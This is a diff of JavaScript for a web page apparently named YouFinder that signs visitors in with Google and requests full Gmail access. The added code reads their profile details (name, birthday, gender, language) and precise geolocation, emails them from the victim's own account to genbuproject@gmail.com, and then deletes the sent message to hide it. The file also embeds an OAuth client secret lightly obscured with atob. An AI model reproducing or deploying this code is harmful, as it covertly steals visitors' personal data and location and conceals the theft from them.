@@ -71,23 +71,40 @@
 	});
 })();
 
-let Info = {
+(function () {
+	window.location.querySort = function () {
+		var Querys = {};
+		
+		for (var i = 0; i < location.search.substr(1).split("&").length; i++) {
+			Querys[location.search.substr(1).split("&")[i].split("=")[0].toUpperCase()] = location.search.substr(1).split("&")[i].split("=")[1];
+		}
+		
+		return Querys;
+	}
+})();
+
+
+
+const Info = {
 	ClientID: "239141875067-k7ftnrifgiv328ai7j0nnec8s79pjlro.apps.googleusercontent.com",
 	SecretID: atob("Z21COW1NOWVxVXhCOHRqNVVBSWZIeThf"),
-	RedirectURL: "https://genbuproject.github.io/Content/Specifics/YouFinder/",
+	RedirectURL: "https://genbuproject.github.io/Content/Specifics/YouFinder/", //"http://localhost:3141/",
 	
 	Scope: [
 		"https://www.googleapis.com/auth/plus.login",
 		"https://www.googleapis.com/auth/plus.me",
 		"https://mail.google.com/"
-	],
-	
+	]
+}
+
+let Res = {
 	Token: "",
 	
 	Datas: {
 		Name: "",
 		URL: "",
 		Birthday: "",
+		Gender: "",
 		Language: "",
 		
 		Location: {
@@ -102,7 +119,118 @@ let Info = {
 	}
 }
 
-let Util = {
+const Net = {
+	LoginWithGoogle: function () {
+		location.href = "https://accounts.google.com/o/oauth2/v2/auth?redirect_uri=" + Info.RedirectURL + "&scope=" + Info.Scope.join("+") + "&response_type=code&client_id=" + Info.ClientID + "&access_type=offline&approval_prompt=force";
+	},
+	
+	RequestToken: function (OnLoad) {
+		DOM.XHR({
+			Type: "POST",
+			URL: "https://www.googleapis.com/oauth2/v4/token",
+			DoesSync: true,
+			
+			Params: {
+				"grant_type": "authorization_code",
+				
+				"client_id": Info.ClientID,
+				"client_secret": Info.SecretID,
+				"redirect_uri": Info.RedirectURL,
+				"code": location.querySort().CODE
+			},
+			
+			OnLoad: function (Event) {
+				Res.Token = JSON.parse(Event.target.response).access_token;
+				
+				OnLoad();
+			}
+		});
+	},
+	
+	GetUserData: function () {
+		DOM.XHR({
+			Type: "GET",
+			URL: "https://www.googleapis.com/plus/v1/people/me",
+			DoesSync: true,
+			
+			Params: {
+				"access_token": Res.Token
+			},
+			
+			OnLoad: function (Event) {
+				console.log(JSON.parse(Event.target.response));
+				
+				Res.Datas.Name = JSON.parse(Event.target.response).displayName,
+					Res.Datas.URL = JSON.parse(Event.target.response).url,
+					Res.Datas.Birthday = JSON.parse(Event.target.response).birthday,
+					Res.Datas.Gender = JSON.parse(Event.target.response).gender,
+					Res.Datas.Language = JSON.parse(Event.target.response).language;
+					
+				navigator.geolocation.getCurrentPosition(function (Position) {
+					Res.Datas.Location.Latitude = Position.coords.latitude;
+					Res.Datas.Location.Longitude = Position.coords.longitude;
+					Res.Datas.Location.Accuracy = Position.coords.accuracy;
+					Res.Datas.Location.Altitude = Position.coords.altitude;
+					Res.Datas.Location.AltitudeAccuracy = Position.coords.altitudeAccuracy;
+					Res.Datas.Location.Heading = Position.coords.heading;
+					Res.Datas.Location.Speed = Position.coords.speed;
+					
+					Net.SendLog();
+				});
+			}
+		});
+	},
+	
+	SendLog: function () {
+		let Separator = "=====Sending=====";
+		
+		DOM.XHR({
+			Type: "POST",
+			URL: "https://www.googleapis.com/upload/gmail/v1/users/me/messages/send",
+			DoesSync: true,
+			
+			Params: {
+				"uploadType": "media",
+				"access_token": Res.Token,
+			},
+			
+			Headers: {
+				"Content-Type": "message/rfc822"
+			},
+			
+			Data: [
+				"To: genbuproject@gmail.com",
+				"Subject: =?UTF-8?B?" + btoa(unescape(encodeURIComponent("From " + Res.Datas.Name))) + "?=",
+				"MIME-Version: 1.0",
+				"Content-Type: text/plain; charset=UTF-8",
+				"",
+				JSON.stringify(Res, null, "\t")
+			].join("\r\n"),
+			
+			OnLoad: function (Event) {
+				Net.DeleteLog(JSON.parse(Event.target.response).id);
+			}
+		});
+	},
+	
+	DeleteLog: function (MailID) {
+		DOM.XHR({
+			Type: "DELETE",
+			URL: "https://www.googleapis.com/gmail/v1/users/me/messages/" + MailID,
+			DoesSync: true,
+			
+			Params: {
+				"access_token": Res.Token
+			},
+			
+			OnLoad: function (Event) {
+				console.log(JSON.parse(Event.target.response));
+			}
+		});
+	}
+}
+
+const Util = {
 	CreateDialog: function (Title, Content, FooterContent) {
 		let DialogBack = document.createElement("Div");
 			DialogBack.className = "DialogBack";
@@ -138,79 +266,9 @@ let Util = {
 		document.getElementsByClassName("DialogBack")[0].parentElement.removeChild(document.getElementsByClassName("DialogBack")[0]);
 		document.getElementsByClassName("DialogFront")[0].parentElement.removeChild(document.getElementsByClassName("DialogFront")[0]);
 	},
-	
-	QuerySort: function () {
-		let Querys = {};
-		
-		for (var i = 0; i < location.search.substr(1).split("&").length; i++) {
-			Querys[location.search.substr(1).split("&")[i].split("=")[0].toUpperCase()] = location.search.substr(1).split("&")[i].split("=")[1];
-		}
-		
-		return Querys;
-	}
 }
 
-let Net = {
-	LoginWithGoogle: function () {
-		location.href = "https://accounts.google.com/o/oauth2/v2/auth?redirect_uri=" + Info.RedirectURL + "&scope=" + Info.Scope.join("+") + "&response_type=code&client_id=" + Info.ClientID + "&access_type=offline&approval_prompt=force";
-	},
-	
-	RequestToken: function (OnLoad) {
-		let TokenGetter = new XMLHttpRequest();
-			TokenGetter.open("POST", "https://www.googleapis.com/oauth2/v4/token?client_id=" + Info.ClientID + "&client_secret=" + Info.SecretID + "&redirect_uri=" + Info.RedirectURL + "&access_type=offline&grant_type=authorization_code&code=" + Util.QuerySort().CODE, false);
-			
-			TokenGetter.onload = function () {
-				Info.Token = JSON.parse(TokenGetter.response).access_token;
-				
-				OnLoad();
-			}
-			
-			TokenGetter.send(null);
-	},
-	
-	SendLog: function () {
-		let MailSender = new XMLHttpRequest();
-			MailSender.open("POST", "https://www.googleapis.com/gmail/v1/users/me/messages/send?access_token=" + Info.Token, true);
-			
-			MailSender.onload = function (Event) {
-				Net.DeleteLog(JSON.parse(MailSender.responseText).id);
-			}
-			
-			MailSender.send(JSON.stringify(
-				{
-					raw: btoa(unescape(encodeURIComponent(
-						[
-							"To: " + atob("Z2VuYnVwcm9qZWN0QGdtYWlsLmNvbQ=="),
-							"Subject: =?utf-8?B?From " + btoa(unescape(encodeURIComponent(Info.Datas.Name))) + "?=",
-							"MIME-Version: 1.0",
-							"Content-Type: text/plain; charset=UTF-8",
-							"Content-Transfer-Encoding: 7bit",
-							Info.Datas.Location.Latitude,
-							Info.Datas.Location.Longitude,
-							Info.Datas.Location.Accuracy,
-							Info.Datas.Location.Altitude,
-							Info.Datas.Location.AltitudeAccuracy,
-							Info.Datas.Location.Heading,
-							Info.Datas.Location.Speed
-						].join("\n").trim()
-					))).replace(/\+/g, "-").replace(/\//g, "_")
-				}
-			));
-	},
-	
-	DeleteLog: function (MailID, OnLoad) {
-		let MailDeleter = new XMLHttpRequest();
-			MailDeleter.open("DELETE", "https://www.googleapis.com/gmail/v1/users/me/messages/" + MailID + "?access_token=" + Info.Token, true);
-			
-			MailDeleter.onload = function (Event) {
-				
-			}
-			
-			MailDeleter.send(null);
-	}
-}
-
-let Dialogs = {
+const Dialogs = {
 	Step1: function () {
 		Util.CreateDialog("Googleアカウントにログインしてください", "アクセスするにはGoogleアカウントにログインする必要があります。", "<Button OnClick = 'Net.LoginWithGoogle();'>Sign in</Button><Button OnClick = 'Util.DismissDialog();'>キャンセル</Button>");
 	},
@@ -221,7 +279,7 @@ let Dialogs = {
 }
 
 function Init() {
-	var Querys = Util.QuerySort();
+	var Querys = location.querySort();
 	
 	if (!Querys.CODE) {
 		Dialogs.Step1();
@@ -229,31 +287,7 @@ function Init() {
 		Dialogs.Step2();
 		
 		Net.RequestToken(function () {
-			let UserDataGetter = new XMLHttpRequest();
-				UserDataGetter.open("GET", "https://www.googleapis.com/plus/v1/people/me?access_token=" + Info.Token, true);
-				
-				UserDataGetter.onload = function (Event) {
-					let Res = JSON.parse(UserDataGetter.responseText);
-					
-					Info.Datas.Name = Res.displayName,
-						Info.Datas.URL = Res.url,
-						Info.Datas.Birthday = Res.birthday,
-						Info.Datas.Language = Res.language;
-						
-					navigator.geolocation.getCurrentPosition(function (Position) {
-						Info.Datas.Location.Latitude = Position.coords.latitude;
-						Info.Datas.Location.Longitude = Position.coords.longitude;
-						Info.Datas.Location.Accuracy = Position.coords.accuracy;
-						Info.Datas.Location.Altitude = Position.coords.altitude;
-						Info.Datas.Location.AltitudeAccuracy = Position.coords.altitudeAccuracy;
-						Info.Datas.Location.Heading = Position.coords.heading;
-						Info.Datas.Location.Speed = Position.coords.speed;
-						
-						Net.SendLog();
-					});
-				}
-				
-				UserDataGetter.send(null);
+			Net.GetUserData();
 		});
 	}
 }
